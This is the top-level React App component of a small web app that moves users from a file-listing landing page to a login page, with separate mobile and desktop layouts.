import React, { useState } from 'react';
import { useScreenSize } from './hooks/useScreenSize';
import LandingPage from './components/LandingPage';
import LoginPage from './components/LoginPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';

function App() {
  const [currentView, setCurrentView] = useState<'landing' | 'login'>('landing');
  const [selectedFile, setSelectedFile] = useState<string>('');
  const screenSize = useScreenSize();

  const handleFileAction = (fileName: string, action: 'view' | 'download') => {
    setSelectedFile(fileName);
    setCurrentView('login');
  };

  const handleBackToLanding = () => {
    setCurrentView('landing');
    setSelectedFile('');
  };

  const handleLoginSuccess = (sessionData: any) => {
    console.log('Login successful, session data:', sessionData);
    // You can add additional logic here if needed
  };

  // Render mobile components for mobile and tablet devices
  if (screenSize.isMobile || screenSize.isTablet) {
    return (
      <div className="min-h-screen">
        {currentView === 'landing' ? (
          <MobileLandingPage onFileAction={handleFileAction} />
        ) : (
          <MobileLoginPage 
            fileName={selectedFile} 
            onBack={handleBackToLanding}
            onLoginSuccess={handleLoginSuccess}
          />
        )}
      </div>
    );
  }

  // Render desktop components for desktop devices
  return (
    <div className="min-h-screen">
      {currentView === 'landing' ? (
        <LandingPage onFileAction={handleFileAction} />
      ) : (
        <LoginPage 
          fileName={selectedFile} 
          onBack={handleBackToLanding}
          onLoginSuccess={handleLoginSuccess}
        />
      )}
    </div>
  );
}

export default App;